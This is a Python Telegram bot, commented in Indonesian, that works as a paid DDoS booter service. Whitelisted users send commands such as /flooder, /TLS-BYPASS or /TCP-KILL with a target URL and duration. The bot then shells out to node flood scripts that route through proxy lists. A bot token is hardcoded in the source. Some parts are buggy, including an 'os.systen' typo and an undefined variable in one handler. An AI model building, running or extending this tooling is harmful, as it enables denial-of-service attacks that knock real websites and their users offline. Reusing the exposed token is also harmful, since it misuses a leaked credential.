import telebot
import os
import time

# Inisialisasi bot Telegram
bot = telebot.TeleBot("6145413336:AAFlIcRYclLQhQav4V8YjvZxaDX7gzHBPMI")

# Fungsi untuk menjalankan script JavaScript dengan input URL dan waktu
def run_flooder(url, time):
    os.system(f"node meris-flooder.js {url} {time} 512 10 GET proxy.txt")

def run_entot(url, time):
    os.system(f"node HTTP-ENTOD.js {url} 512 {time} ")
    
def run_raw(url, time):
    os.system(f"node HTTP-RAW.js {url} {time}")
    
def run_rand(url, time):
    os.system(f"node HTTP-RAND.js {url} {time}")

def run_tls(url, time):
    os.system(f"node tlsv2.js {url} {time} 10 512 proxy.txt")
    
def run_tcpkill(url, time):
    os.system(f"node tcp-kill.js {url} {time} 443")
    
def run_tlsbypass(url):
    os.systen(f"node TLS-BYPASS.js {url} 120 60 98 proxy.txt")

def run_tlsflooder(url, time):
    os.systen(f"node TLS-FLOODER.js {url} {time} 10 10 proxy.txt")   
# Daftar username yang diizinkan
allowed_usernames = ["FebryPendosa12", "icancool"]

# Usage Akses
@bot.message_handler(commands=['usage'])
def start(message):
  bot.reply_to(message, text='Cara Menggunakan /[METHOD] [URL] [TIME] Untuk Thread Dll Sudah Owner Setting Agar Tidak Melebihi Batas Anj')
# Handler untuk perintah /start
@bot.message_handler(commands=['start'])
def start(message):
    # Memeriksa apakah username pengguna terdaftar
    if message.from_user.username in allowed_usernames:
        bot.reply_to(message, '''Halo! Akses Diterima
        
        tutorial memakai /usage
        show all method /method''')
    else:
        bot.reply_to(message, "Akses ditolak. Username Anda tidak terdaftar harap membeli plan Hwheheh")

# Menu
@bot.message_handler(commands=['menu'])
def menu(message):
    bot.reply_to(message, text='Usage : /[METHOD] [URL] [TIME] Thread Dll Owner Yang Nentuin Anj')
# Handler untuk perintah /attack
@bot.message_handler(commands=['flooder'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, time = message.text.split(' ', 2)
    
    # Memastikan URL dan waktu tidak kosong
    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_flooder(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
#jago
@bot.message_handler(commands=['HTTP'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, time = message.text.split(' ', 2)
    
    # Memastikan URL dan waktu tidak kosong
    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_entot(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        
#raw
@bot.message_handler(commands=['HTTP-RAW'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, time = message.text.split(' ', 2)
    
    # Memastikan URL dan waktu tidak kosong
    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_raw(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        
#rand
@bot.message_handler(commands=['HTTP-RAND'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, time = message.text.split(' ', 2)
    
    # Memastikan URL dan waktu tidak kosong
    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_rand(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        
#rand
@bot.message_handler(commands=['TLS'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, time = message.text.split(' ', 2)
    
    # Memastikan URL dan waktu tidak kosong
    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tls(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")

@bot.message_handler(commands=['TCP-KILL'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, time = message.text.split(' ', 2)
    
    # Memastikan URL dan waktu tidak kosong
    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tcpkill(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        
@bot.message_handler(commands=['TLS-BYPASS'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, = message.text.split(' ', 1)
    
    # Memastikan URL dan waktu tidak kosong
    if url:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tlsbypass(url,)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")        
@bot.message_handler(commands=['TLS-FLOODER'])
def run(message):
    # Memisahkan perintah, URL, dan waktu
    command, url, time = message.text.split(' ', 2)
    
    # Memastikan URL dan waktu tidak kosong
    if url and time:
        bot.reply_to(message, f"Menjalankan ddos untuk {url} selama {time} detik...")
        run_tlsflooder(url, time)
        bot.reply_to(message, "Attack Succesfully")
    else:
        bot.reply_to(message, "URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.")
        
@bot.message_handler(commands=['method'])        
def method(message):
    response = '''L7 :
HTTP
HTTP-RAW
HTTP-RAND
FLOODER
TLS
TLS-BYPASS
TLS-FLOODER

L4 :
TCP-KILL'''
    bot.reply_to(message, response)
   
    
# Handler untuk pesan selain perintah
@bot.message_handler(func=lambda message: True)
def echo(message):
    bot.reply_to(message, "Maaf, perintah tidak valid. Ketik /start untuk memulai.")

# Menjalankan bot Telegram
bot.polling()